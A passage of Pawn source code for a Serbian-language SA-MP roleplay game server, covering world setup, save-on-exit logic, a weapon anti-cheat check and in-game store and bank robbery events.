            new String: string = str_format("%s\nID:%d", ActorInfo[ActorID][aIme], ActorID);
            ActorActor[ActorID] = CreateActor(ActorInfo[ActorID][aSkin], ActorInfo[ActorID][aPosX], ActorInfo[ActorID][aPosY], ActorInfo[ActorID][aPosZ], ActorInfo[ActorID][aRot]);
            ActorLabel[ActorID] = pp_CreateDynamic3DTextLabel(string, 0x33CCFFAA, ActorInfo[ActorID][aPosX], ActorInfo[ActorID][aPosY], ActorInfo[ActorID][aPosZ]+1.0, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
        }
    }
    //Tutorial by V01D
    CreateObject(18981, 2553.68359, -1288.68909, 1059.40405,   0.00000, 90.00000, 0.00000);
    SefActorIntro = CreateActor(113, 2550.6763,-1284.6066,1060.9844,88.8191);
    BodyGuardActor1 = CreateActor(164, 2550.2681,-1283.2328,1060.9844,89.3009);
    BodyGuardActor2 = CreateActor(164, 2549.9275,-1285.8989,1060.9844,17.5469);
    ApplyActorAnimation(SefActorIntro, "MISC","SEAT_LR",4.0,1,1,1,1,0);
    ApplyActorAnimation( BodyGuardActor1, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    ApplyActorAnimation( BodyGuardActor2, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
    SetActorVirtualWorld(SefActorIntro, 2);
    SetActorVirtualWorld(BodyGuardActor1, 2);
    SetActorVirtualWorld(BodyGuardActor2, 2);


    VoziloTut = CreateVehicle(451, 2556.8789,-1288.0742,1060.7698,58.8762, 0, 0, 0, 0);
    LinkVehicleToInterior(VoziloTut, 2);
    ResetVehicleStatistics(VoziloTut);
    SetVehicleParamsEx(VoziloTut, 0, VEHICLE_PARAMS_ON, 0, 0, 0, 0, 0);
    SetVehicleVirtualWorld(VoziloTut, 2);
	//==================================== [ RENT ] =====================================

	for(new rent = 0; rent < sizeof(RentInfo); rent++)
    {
        new fFile[80], string[220];
        format(fFile, 80, RENTLOCATION_FILE, rent);
        if(fexist(fFile))
        {
            INI_ParseFile(fFile, "UcitajRentLokacije", .bExtra = true, .extra = rent);
            format(string, 220, ""col_crvena"[ RENT VOZILA ]\nID: "col_white"%d\n"col_crvena"[ /rent ]", rent);
    		RentLabel[rent] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, RentInfo[rent][rPosX], RentInfo[rent][rPosY], RentInfo[rent][rPosZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);
    		RentPickup[rent] = CreateDynamicPickup(19135, 1, RentInfo[rent][rPosX], RentInfo[rent][rPosY], RentInfo[rent][rPosZ], -1, -1, -1, 30.0, -1, 0);
        }
    }

	//--========ONLINE REKORD
	DosadasnjiRekord();
	onlinepl=Konektovano();

    //==================================== [ ZATVOR ] =============================================
    ZatvorActor = CreateActor(95, -1463.2039,-1547.4755,101.8390, 264.4535);
    ApplyActorAnimation(ZatvorActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );

    Create3DTextLabel("Bezanje iz Zatvora\n[ /bezanjezatvor ]", -1, -1463.2039,-1547.4755,101.8390, 10.0, 0, 0);
	//==================================== [ VOJNIK POSAO ] =======================================

	GeneralActor = CreateActor(286, 406.5945, 2532.9226, 16.5527, 131.6521); //General

	NaucnikActor = CreateActor(70, 275.2628, 1860.3334, 8.7578, 187.0918); //Naucnik
	SetActorInvulnerable(NaucnikActor, 0);

	NaucnikActor1 = CreateActor(70, 298.2859,1840.8370,7.8281, 19.8901);
	SetActorInvulnerable(NaucnikActor1, 0);

	SabotazerActorPosao = CreateActor(187, -2614.8389,1430.6879,7.1607,35.0329);
	ApplyActorAnimation( SabotazerActorPosao, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );

	Kapetan1 = CreateActor(255,-2471.3733,1551.5309,33.2273,272.4669);
	SetActorInvulnerable(Kapetan1, 0);

	Kapetan2 = CreateActor(255,-2470.8997,1544.6779,33.2344,270.5869);
	SetActorInvulnerable(Kapetan2, 0);

	//PLATFORMA BROD ZA SABOTAZER
	CreateObject(18766, -2329.33667, 1527.75049, 0.02179,   90.00000, 0.00000, 0.00000);
	CreateObject(18980, -2329.10400, 1529.75598, 5.15491,   0.00000, 0.00000, 11.02010);
	//Objekti radi izgleda
	CreateDynamicObject(358, 407.61569, 2532.05884, 16.74680,   68.00000, 0.00000, 0.00000);
	CreateDynamicObject(360, 407.12521, 2530.42920, 16.80660,   90.00000, 0.00000, 0.00000);
	CreateDynamicObject(1242, 408.80911, 2531.01831, 16.92180,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(356, 408.46191, 2530.73242, 16.79980,   90.00000, 0.00000, 0.00000);
	CreateDynamicObject(351, 409.37439, 2529.55811, 16.75980,   80.00000, 0.00000, 0.00000);
	CreateDynamicObject(347, 409.77899, 2529.84448, 16.76620,   100.00000, 0.00000, 0.00000);
	CreateDynamicObject(362, 410.01062, 2527.33423, 15.66040,   -18.00000, -33.00000, 13.00000);
	CreateDynamicObject(19515, 410.56842, 2528.81372, 16.97350,   0.00000, 270.00000, 149.00000);
	CreateDynamicObject(19107, 410.81329, 2528.26807, 16.83950,   200.00000, 91.00000, 0.00000);

	//Objetki u vojnoj bazi
	CreateDynamicObject(19462, 266.59753, 1816.99548, 5.44431,   0.00000, 0.00000, 0.00000);
	CreateDynamicObject(19462, 266.59656, 1817.01550, 8.87976,   0.00000, 0.00000, 0.00000);
	//Drugi objekti
	KontrolnaTabla = CreateObject(3386, 249.38762, 1859.35437, 12.95791,   0.00000, 0.00000, 180.00000);

	BlackTD = TextDrawCreate(-33.200031, -26.035589, "box");
	TextDrawLetterSize(BlackTD, 0.000000, 61.519996);
	TextDrawTextSize(BlackTD, 743.000000, 0.000000);
	TextDrawAlignment(BlackTD, 1);
	TextDrawColor(BlackTD, -1);
	TextDrawUseBox(BlackTD, 1);
	TextDrawBoxColor(BlackTD, 255);
	TextDrawSetShadow(BlackTD, 0);
	TextDrawBackgroundColor(BlackTD, 255);
	TextDrawFont(BlackTD, 1);
	TextDrawSetProportional(BlackTD, 0);
	TextDrawSetSelectable(BlackTD, true);

	//==================================== [ DILER POSOA ] ========================================
	DilerPosaoActor = CreateActor(241, 902.5450,-1819.6349,12.5567, 225.9663);
	ApplyActorAnimation( DilerPosaoActor, "DEALER", "DEALER_IDLE", 4.0, 1, 1, 1, 1, 0 );
	CreateDynamic3DTextLabel(""col_white"Da prodate drogu kucajte\n"col_crvena"[ /prodajdrogu ]", -1, 902.5450,-1819.6349,12.5567, 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);

	//=================================== [ PLANTAZE UCITAVANJE BY V01D ] =========================
	for(new plant=0; plant<MAX_PLANTAZA; plant++)
    {
        new drugFile[40], string[256];
        format(drugFile, 40, PLANTAZE_FILE, plant);
        if(fexist(drugFile))
        {
            INI_ParseFile(drugFile, "UcitajPlantazePosao", .bExtra = true, .extra = plant);

            if(strcmp( PlantazaInfo[plant][drogaPosadio], "Niko", true ))
            {
                if(PlantazaInfo[plant][drogaVreme] == 0)
                {
                    format(string, sizeof(string), ""col_crvena"[ "col_white"PLANTAZA"col_crvena" ]\nZasadio: "col_white"%s\n"col_crvena"ID: "col_white"%d\n"col_crvena"[ /uberidrogu /ukradidrogu ]", PlantazaInfo[plant][drogaPosadio], plant);
                }
                else if(PlantazaInfo[plant][drogaVreme] > 0)
                {
                    format(string, sizeof(string), ""col_crvena"[ "col_white"PLANTAZA"col_crvena" ]\nZasadio: "col_white"%s\n"col_crvena"ID: "col_white"%d\n"col_crvena"Nije Sazrelo\nPreostalo : "col_white"%d", PlantazaInfo[plant][drogaPosadio], plant, PlantazaInfo[plant][drogaVreme]);
                    defer DrogaPlantazaTimer(plant);
                }
                PlantazaObjekat[plant] = CreateObject(824, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ]-1, 0.0, 0.0, 0.0);
            }
            else if(!strcmp( PlantazaInfo[plant][drogaPosadio], "Niko", true ))
            {
                format(string, sizeof(string), ""col_green"[ "col_white"PLANTAZA"col_green" ]\nZasadio: "col_white"%s\n"col_green"ID: "col_white"%d"col_green"\n/posadidrogu", PlantazaInfo[plant][drogaPosadio], plant);
                PlantazaObjekat[plant] = CreateObject(824, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ]-2.5, 0.0, 0.0, 0.0);
            }

            PlantazaLabel[plant] = CreateDynamic3DTextLabel(string, 0x33CCFFAA, PlantazaInfo[plant][drogaX], PlantazaInfo[plant][drogaY], PlantazaInfo[plant][drogaZ], 30.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 30.0, -1, 0);     
        }
    }
	//=================================== [ FUNRACE OBJECTS ] =====================================
	CreateObject(2990, -2689.89380, -2648.99634, 10.16452,   0.00000, 0.00000, 0.00000);
	CreateObject(2990, -2679.90576, -2648.94019, 11.08273,   0.00000, 0.00000, 0.00000);
	CreateObject(2990, -2689.90918, -2638.93018, 10.16452,   0.00000, 0.00000, 0.00000);
	CreateObject(2990, -2679.85205, -2638.98828, 10.16659,   0.00000, 0.00000, 0.00000);
	CreateObject(2990, -2674.84595, -2644.08447, 10.76230,   0.00000, 0.00000, 90.00000);
	//============================================================================================

	VoidHungerKurcina();

	SetGameModeText( VERZIJA_MODA );
	SendRconCommand( "language "MAP_NAME"" );

	EnableStuntBonusForAll( 0 );
	DisableInteriorEnterExits( );
	ManualVehicleEngineAndLights( );
	UsePlayerPedAnims( );
    AllowInteriorWeapons( 1 );
    ShowPlayerMarkers( 0 );

    granicabgzgulaz = CreateObject(968, 56.10600, -1529.38794, 5.06500,   0.00000, -90.00000, -97.00000);
    granicabgzgizlaz = CreateObject(968, 47.12800, -1533.81104, 5.06500,   4.00000, -91.00000, 83.00000);
    granicabgsaulaz = CreateObject(968, 1799.76697, 785.57800, 11.51600,   0.00000, -90.00000, -178.00000);
    granicabgsaizlaz = CreateObject(968, 1792.74097, 785.83301, 11.21100,   0.00000, -90.00000, -3.92000);

    granicaLSFlorida = CreateDynamicObject(968, 3732.051757, -970.648254, 10.921833, 0.000000, 90.000000, -60.699993, -1, -1, -1, 300.00, 300.00); //LS - FLORIDA
    granicaFloridaLS = CreateDynamicObject(968, 3721.988281, -976.295959, 10.921833, 0.000000, 90.000000, 119.300003, -1, -1, -1, 300.00, 300.00); //FLORIDA - LS

    ServerInfo[ Prognozasys ] = 10;
    SetWeather( 10 );

    MapAndreas_Init( MAP_ANDREAS_MODE_FULL );

    LoadScriptfiles( );
    LoadVehicles( );
    // vehicleCheck();
    CreateMapIcons( );
    CreateTextDraws( );
    DefineGatesAndDoors( );
    CreatePickupsAnd3Ds( );
    ResetAllFarmPlants( );
    PostaviParoveKladionica( );
    
    Streamer_VisibleItems(STREAMER_TYPE_OBJECT,1000);

    gettimeEx(ghour, gminute, gsecond);
	FixHour(ghour);
	ghour = shifthour;
	if( !realtime ) {
		SetWorldTime(wtime);
		ServerInfo[ VremeInGame ] = wtime;
	}

	AntiDeAMX();

    AdminBaza = CreateDynamicRectangle( -352.0072, 2230.4553, -75.6204, 2450.2144 );
    SpawnZona = CreateDynamicRectangle( 948.5184, -1312.2224, 1046.5076, -1228.6466 );
    BinaBre = CreateDynamicRectangle( 251.1193, -2379.8245, 477.1770, -2081.1726 );
    MafijaTSM = CreateDynamicRectangle( 2933.0054, -783.7261, 3245.6345, -581.9924 );
    MafijaY = CreateDynamicRectangle( 880.7760, -2215.2932, 1030.9274, -2053.8196 );
    VIPBaza = CreateDynamicRectangle( 1921.6095, -50.8012, 2014.0657, 40.8848 );
    FBIBaza = CreateDynamicRectangle( 643.8707, -1388.5138, 790.8174, -1328.1101 );
    FarmerPosao = CreateDynamicRectangle( -1224.0177, -1220.6852, -1027.5038, -1064.8070 );
    GradjPosao = CreateDynamicRectangle( 2377.9812, -1373.5167, 2444.1853, -1264.4025 );
    SSB = CreateDynamicRectangle( 1951.0851, -1744.1436, 1966.6748, -1723.7572 );
    KosacMost = CreateDynamicRectangle( 1956.7731, -1262.3374, 1985.3881, -1138.9209 );
    ZgradaNeka = CreateDynamicRectangle( 1521.3862, -1378.1085, 1564.0503, -1333.2006 );
    GSFMost = CreateDynamicRectangle( 2412.8169, -1722.5156, 2447.5449, -1575.6823 );
    glenParkZona = CreateDynamicRectangle(1857.866943359375, -1257.6001281738281, 2064.866943359375, -1143.6001281738281, -1, -1, -1, 0);

   	DilerActor = CreateActor( 28, 1641.5375,-1679.3185,13.5371,102.0535);
   	SetActorPos(DilerActor, 1641.5375,-1679.3185,13.5371);
   	ApplyActorAnimation(DilerActor,  "DEALER", "DEALER_IDLE", 4.0, 1, 0, 0, 0, 0 );

	//-------[Interijeri]--------
    //KreirajInterijer("Advokatska Redakcija", 1786.7190,-1300.0983,13.4493, 1786.2195,-1303.7476,120.3036, 0, 0, 0, 0);
	KreirajInterijer("Opstina BG", 1479.4249,-1799.7944,13.2859, -1840.2518,2670.2393,3.5884, 0, 0, 0, 0);
    KreirajInterijer("Autoskola BG", 1914.5627,-1864.3698,13.5622, 820.2128,-509.8688,996.6475, 0, 0, 0, 0);
    KreirajInterijer("Posao Moler", 919.4655,-1252.0830,16.2109, -1694.1378,1035.6403,45.2109, 0, 0, 0, 0);
    KreirajInterijer("Fabrika Oruzija", 3823.3127,-1152.8422,10.9416, 504.9705,-2318.2881,512.7908, 0, 0, 0, 0);
    KreirajInterijer("Misije", 970.4238,-1563.7939,13.5993, 960.8937,-1557.8662,21.5722, 0, 0, 0, 0);
    KreirajInterijer("Baza Mafije", 1488.8772,-1720.5851,8.2330, 1489.6128,-1717.4843,8.2542, 0, 0, 0, 0);
    KreirajInterijer("Hacker Center", 2292.4126,-1723.4347,13.5469, 987.3414,-1522.8057,2200.7690, 0, 0, 0, 0);
    KreirajInterijer("Stock Market", 593.2657,-1250.2496,18.2236, -791.2271,1949.7565,3.0459, 0, 0, 0, 0);
    KreirajInterijer("PornHub HQ", 1327.4409,-1556.5525,13.5397, 800.7892,-1328.7428,710.3306, 0, 0, 0, 0);
    //KreirajInterijer("Nargila Bar", 1372.5978,-1387.0750,13.6674, 2329.4490,2051.8274,329.9031, 0, 0, 0, 0);
    KreirajInterijer("Banka", 1531.9351,-1132.5072,24.1279, 1032.5773,1871.5029,1203.5000, 0, 0, 0, 0);
    KreirajInterijer("Biro za Zaposljavanje",  3648.4316,-1041.3040,11.4882, -792.1399,1001.9034,-56.5587, 0, 0, 0, 0);
    KreirajInterijer("Rolex Store",  1799.2058,-1253.8257,13.6571, 1799.3633,-1251.4226,13.6499, 0, 0, 0, 0);
    KreirajInterijer("Electronic Store",  927.1081,-1520.0204,13.5404, 930.6066,-1520.0828,13.5960, 0, 0, 0, 0);


    for( new askid = 1; askid < MAX_ASKQS; askid++ ) {
		askqList[ askid ][ askqSend ] = false;
		askqList[ askid ][ askqID ] = -1;

		strmid( askqList[ askid ][ askqOwner ], "None", 0, strlen( "None" ), 32 );
		strmid( askqList[ askid ][ askqQuestion ], "None", 0, strlen( "None" ), 128 );
	}

	if( realtime ) {
		new tmphour,
		    tmpminute,
		    tmpsecond;

		gettimeEx( tmphour, tmpminute, tmpsecond );
		FixHour( tmphour );
		tmphour = shifthour;
		SetWorldTime( tmphour );
		ServerInfo[ VremeInGame ] = tmphour;
		
 		
	}

	return true;
}

public OnGameModeExit( ) {

    //Cycle Attach
    for(new i = 0; i < MAX_PLAYERS+1; i++) if(IsPlayerConnected(i)) if(!IsPlayerNPC(i)) for(new a = 0; a < 10; a++) if(IsPlayerAttachedObjectSlotUsed(i, a)) RemovePlayerAttachedObject(i, a);

    foreach(Player, i) {

        if(PlayerLogged[i]) {

            SavePlayer(i);

            if(OrgVeh[i] != -1) {

                new id = OrgVehID[i];
                if(OrgVehBroj[i] == 1) {

                    OrgVehInfo[id][oVehKolicina1]++;
                }
                if(OrgVehBroj[i] == 2) {

                    OrgVehInfo[id][oVehKolicina2]++;
                }
                if(OrgVehBroj[i] == 3) {

                    OrgVehInfo[id][oVehKolicina3]++;
                }
                if(OrgVehBroj[i] == 4) {

                    OrgVehInfo[id][oVehKolicina4]++;
                }
                if(OrgVehBroj[i] == 5) {

                    OrgVehInfo[id][oVehKolicina5]++;
                }
                SacuvajOrgVehPickup(id);
            }
        }
    }

    for( new f = 0; f < MAX_BUSSINES; f++ ) {
	    new gFile[ 40 ];
		format( gFile, 40, F_FILE, f );
		if( fexist( gFile ) ) {
			SaveBussines( f );
		}
	}
	for( new c = 0; c < MAX_CARS; c++ ) {
	    new gFile[ 40 ];
		format( gFile, 40, V_FILE, c );
		if( fexist( gFile ) ) {
			SaveVehicle( c );
		}
	}
	for( new im = 0; im < MAX_IMOVINA; im++ ) {
	    new gFile[ 40 ];
		format( gFile, 40, IM_FILE, im );
		if( fexist( gFile ) ) {
			SaveProperty( im );
		}
	}
	foreach( Player, i ) {
		Novi_KillTimer( gZone_Timer[ i ] );
	    Novi_KillTimer( TimerLearn[ i ] );
	    Novi_KillTimer( atmrobTimer[ i ] );
		Novi_KillTimer( SkolaTimer[ i ] );
		Novi_KillTimer( TimerPitanje[ i ] );
		Novi_KillTimer( RentTimer[ i ] );
		Novi_KillTimer( DragTimer[ i ] );
		Novi_KillTimer( TimerTutorial[ i ] );
		Novi_KillTimer( FarbanjeTimer[ i ] );
		Novi_KillTimer( BolnicaTimer[ i ] );
		Novi_KillTimer( TaxiTimer[ i ] );
		Novi_KillTimer( TazerTimer[ i ] );
		Novi_KillTimer( CistacTimer[ i ] );
		Novi_KillTimer( TrashTimer[ i ] );
		Novi_KillTimer( PilotTimer[ i ] );
		Novi_KillTimer( FarbanjeTimer[ i ] );
		Novi_KillTimer( TravaTimer[ i ] );
		Novi_KillTimer( PljackanjeBankeTimer[ i ] );
		Novi_KillTimer( PljackanjeZlatareTimer[ i ] );
		Novi_KillTimer( rudarPosao[ i ][ rudarTimer ] );
	}
	return true;
}

stock CheckWeapons( i ) {
	if( antiCheatSS[ antiWeaponH ] == true ) {
		if( antiCheatCS[ i ][ WeaponDetect ] <= 0 ) {
			if( NaDmEventu[ i ] == false && antiCheatCS[ i ][ WeaponCheck ] == 1 && GetPlayerSpecialAction( i ) != SPECIAL_ACTION_ENTER_VEHICLE && GetPlayerSpecialAction( i ) != SPECIAL_ACTION_EXIT_VEHICLE ) {

				new bullets[ MAX_W_SLOTS ], weapon[ MAX_W_SLOTS ];
				for( new slot = 0; slot < MAX_W_SLOTS; slot++ ) {

					bullets[ slot ] = 0; weapon[ slot ] = 0;

		       		GetPlayerWeaponData( i, slot, weapon[ slot ], bullets[ slot ] );

					if( IsValidWeapon( weapon[ slot ] ) && !Novi_IsGiveVehicleWeapon( weapon[ slot ] ) ) { 

						if( antiCheatCS[ i ][ Weapon ][ slot ] != weapon[ slot ] && weapon[ slot ] != 0 && bullets[ slot ] != 0 ) {

							antiCheatCS[ i ][ TakenWeapon ] = weapon[ slot ];
							OnPlayerCheat( i, DETECT_WEAPON_HACK, 0, 0 );
						}
						else if( ( ( antiCheatCS[ i ][ Ammo ][ slot ] - bullets[ slot ] ) < 0 ) && Novi_IsNotWeaponNoAmmo( weapon[ slot ] ) && weapon[ slot ] != 0 ) {

	                    	antiCheatCS[ i ][ TakenWeapon ] = weapon[ slot ];
							OnPlayerCheat( i, DETECT_AMMO_HACK, bullets[ slot ], antiCheatCS[ i ][ Ammo ][ slot ]  );
						}
         				else if( antiCheatCS[ i ][ Weapon ][ slot ] != 0 && weapon[ slot ] == 0 && bullets[ slot ] == 0 ) {
         				
         				    antiCheatCS[ i ][ Weapon ][ slot ] = 0;
						    antiCheatCS[ i ][ Ammo ][ slot ] = 0;
						}
						else if( bullets[ slot ] != 0 ) antiCheatCS[ i ][ Ammo ][ slot ] = bullets[ slot ];

					}
				}
			}
		}
		else {
	 	    antiCheatCS[ i ][ WeaponDetect ]--;
		}

	}
}

stock GetXYZInFrontOfPlayer(playerid, &Float: xbr, &Float: ybr, &Float: zbr, Float: distance) {
	new Float: a;

	GetPlayerPos (playerid, xbr, ybr, zbr);
	GetPlayerFacingAngle (playerid, a);

	xbr += (distance * floatsin (-a, degrees));
	ybr += (distance * floatcos (-a, degrees));
}

public OnPlayerGiveDamageActor(playerid, damaged_actorid, Float:amount, weaponid, bodypart)
{

    if(damaged_actorid == RolexCuvar) {

        if(!ClanIlegalaca(playerid)) return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");
        if(PlayerInfo[playerid][xLider] == 0) return SendErrorMessage(playerid, "Ovaj rob moze pokrenuti samo lider!");
        if(RolexUToku) return SendErrorMessage(playerid, "Rolex rob je u toku!");
        if(RolexBioSkoro) return SendErrorMessage(playerid, "Moras sacekati malo pre ponovnog roba Rolex Store-a!");
        if(BankaUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka banke u toku!");
        if(ZlataraRobUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka zlatare u toku!");
        if(MuzejPokrenut) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka muzeja u toku!");
        if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
        if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");

        // new pd, ilegala;

        // foreach( Player, i ) {
        //     if( IsPlayerConnected( i ) ) {
        //         if(GetFactionType(i) == ORG_TIP_PD) pd++;
        //         else if(PlayerInfo[i][xClan] == PlayerInfo[playerid][xClan]) ilegala++;
        //     }
        // }

        // if(pd < 2) {

        //     SendErrorMessage(playerid, "Nema dovoljno clanova policije ( minimalno 3 )!");
        //     return 0;
        // }
        // if(ilegala < 2)  {

        //     SendErrorMessage(playerid, "Nema dovoljno tvojih clanova ( minimalno 3)!");
        //     return 0;
        // }

        ApplyActorAnimation(RolexCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(RolexCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(RolexCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(RolexCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        SendInfoMessage(playerid, "Pokrenuo si rob Rolex Store-a! Pokradi rafove koristeci tipku 'Y' !");
        
        RolexUToku = true;
        rolexRobaOrg = PlayerInfo[playerid][xLider];
        opljackaniRafovi = 0;
        unistiRolexPickup();
        kreirajRolexPickup();

        defer rolexRobTimer();

        PostaviWanted(playerid, "Rob Rolex Store-a", "Nadzorna Kamera", 10);

        //CRVENAVandredne vesti: BELA Pljacka banke je u toku, molimo nadlezne da reaguju civili da se odmaknu
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Kako doznajemo naoruzani maskirani muskarci, navodno pripadnici kriminalne grupe trenutno pljackaju Rolex Store!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"NAPOMENA: "col_white"Policijske snage ce uskoro reagovat, a civile molimo da se "SRVBOJA1SCM"ODMAKNU "col_white"od Rolex Store-a!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");
        foreach( Player, i ) {
            if( IsPlayerConnected( i ) ) {
                if(GetFactionType(i) == ORG_TIP_PD) {
                    SendInfoMessage(i, "Cuvar u Rolex Store-u je ubijen! Sve jedinice na lice mesta!");
                }
            }
        }

        return 1;
    }

    if(damaged_actorid == BankaCuvar) {

        if(!ClanIlegalaca(playerid)) return SendErrorMessage(playerid, "Samo clanovi bande/mafije!");
        if(BankaOrobana) return SendErrorMessage(playerid, "Banka je vec orobana!");
        if(BankaUToku) return SendErrorMessage(playerid, "Rob je u toku!");
        if(RolexUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka rolex store-a u toku!");
        if(ZlataraRobUToku) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka zlatare u toku!");
        if(MuzejPokrenut) return SendErrorMessage(playerid, "Ne mozes to dok je pljacka muzeja u toku!");
        if( GetPlayerWeapon(playerid) == 0) return SendErrorMessage(playerid, "Morate imati oruzije kod sebe!");
        if( PlayerInfo[playerid][xWanted] >= 1) return SendErrorMessage(playerid, "Trazeni ste, ne mozete to!");

        // new pd, ilegala;

        // foreach( Player, i ) {
        //     if( IsPlayerConnected( i ) ) {
        //         if(GetFactionType(i) == ORG_TIP_PD) pd++;
        //         else if(PlayerInfo[i][xClan] == PlayerInfo[playerid][xClan]) ilegala++;
        //     }
        // }

        // if(pd < 2) {

        //     SendErrorMessage(playerid, "Nema dovoljno clanova policije ( minimalno 3 )!");
        //     return 0;
        // }
        // if(ilegala < 2)  {

        //     SendErrorMessage(playerid, "Nema dovoljno tvojih clanova ( minimalno 3)!");
        //     return 0;
        // }

        ApplyActorAnimation(BankaCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(BankaCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(BankaCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);
        ApplyActorAnimation(BankaCuvar, "PED", "KO_shot_stom", 4.0, 0, 0, 0, 0, 0);

        SendInfoMessage(playerid, "Pokrenuo si rob banke! Postavi busilicu ispred sefa koristeci tipku N");
        SendInfoMessage(playerid, "Ne smes da napustis banku inace ce se rob prekinuti!");
        BankaUToku = true;
        RobaBanku[playerid] = true;
        PostaviBusilicu[playerid] = true;

        PostaviWanted(playerid, "Rob Banke", "Nadzorna Kamera", 10);

        foreach(Player, i) {

            if(IsPlayerConnected(i)) {

                if(UBanci[i]) {

                    if(PlayerInfo[playerid][xClan] == PlayerInfo[i][xClan]) {

                        if(playerid == i) continue;
                        PostaviWanted(playerid, "Rob Banke", "Nadzorna Kamera", 3);
                    }
                }
            }
        }
        //CRVENAVandredne vesti: BELA Pljacka banke je u toku, molimo nadlezne da reaguju civili da se odmaknu
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"====================================="col_white" [ VANDREDNE VESTI ] "SRVBOJA1SCM"=====================================");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"REPORTER: "col_white"Kako doznajemo naoruzani maskirani muskarci, navodno pripadnici kriminalne grupe trenutno pljackaju banku!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"NAPOMENA: "col_white"Policijske snage ce uskoro reagovat, a civile molimo da se "SRVBOJA1SCM"ODMAKNU "col_white"od Banke!");
        SendClientMessageToAll(-1, ""SRVBOJA1SCM"===============================================================================================================");
        foreach( Player, i ) {
            if( IsPlayerConnected( i ) ) {
                if(GetFactionType(i) == ORG_TIP_PD) {
                    SendInfoMessage(i, "Cuvar u banci je ubijen! Sve jedinice na lice mesta!");
                }
            }
        }

        return 1;
    }

    if(damaged_actorid == vojnik2EnemyT1 && weaponid == 34 && vojnik2CP[playerid] >= 12 && vojnik2CP[playerid] <= 13 && !Ubio1[playerid]) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
        GetActorPos(vojnik2EnemyT1, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCameraToranj(playerid, 1);

        return 0;
    }

    if(damaged_actorid == vojnik2EnemyT2 && weaponid == 34 && vojnik2CP[playerid] >= 12 && vojnik2CP[playerid] <= 13 && !Ubio2[playerid]) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
        GetActorPos(vojnik2EnemyT2, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCameraToranj(playerid, 2);

        return 0;
    }

    if(damaged_actorid == vojnik2Enemy1 && weaponid == 34 && vojnik2CP[playerid] == 5) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
        GetActorPos(vojnik2Enemy1, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCamera(playerid, 1);

        return 0;
    }

    if(damaged_actorid == vojnik2Enemy2 && weaponid == 34 && vojnik2CP[playerid] == 6) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
        GetActorPos(vojnik2Enemy2, ActorPos[0], ActorPos[1], ActorPos[2]);

        TogglePlayerControllable(playerid, 0);

        InterpolateCameraPos(playerid, Pos[0], Pos[1], Pos[2], ActorPos[0], ActorPos[1], ActorPos[2], 4000, CAMERA_CUT);

        defer resetCamera(playerid, 2);

        return 0;
    }

    if(damaged_actorid == vojnik2Enemy3 && weaponid == 34 && vojnik2CP[playerid] == 7) {

        new Float:Pos[3];
        GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
        new Float:ActorPos[3];
